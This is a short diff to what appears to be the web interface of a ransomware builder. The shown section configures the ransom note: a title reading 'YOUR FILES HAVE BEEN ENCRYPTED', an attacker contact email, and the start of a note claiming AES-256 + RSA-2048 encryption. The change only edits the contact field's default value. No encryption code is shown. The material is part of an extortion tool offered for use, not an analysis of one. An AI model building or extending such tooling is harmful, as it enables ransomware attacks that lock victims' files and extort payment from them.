@@ -142,7 +142,7 @@ $__kfiles = [
 <h3 style="color:var(--accent2);font-size:.9rem;margin-bottom:12px"><i class="fas fa-scroll"></i> 勒索信配置</h3>
 <div class="gen-opts" style="grid-template-columns:1fr 1fr">
   <div class="field"><label>勒索标题</label><input type="text" id="ransom-title" value="YOUR FILES HAVE BEEN ENCRYPTED"></div>
-  <div class="field"><label>联系方式</label><input type="text" id="ransom-contact" value="Contact: jasmin@protonmail.com" placeholder="Email / Telegram / Bitcoin address"></div>
+  <div class="field"><label>联系方式</label><input type="text" id="ransom-contact" value="jasmin@protonmail.com" placeholder="Email / Telegram / Bitcoin address"></div>
 </div>
 <div class="field" style="margin-bottom:14px"><label>勒索信正文 (支持多行)</label>
 <textarea id="ransom-body" rows="4" style="width:100%;padding:10px 14px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.84rem;resize:vertical;font-family:monospace">All your files have been encrypted with AES-256 + RSA-2048 military-grade encryption.
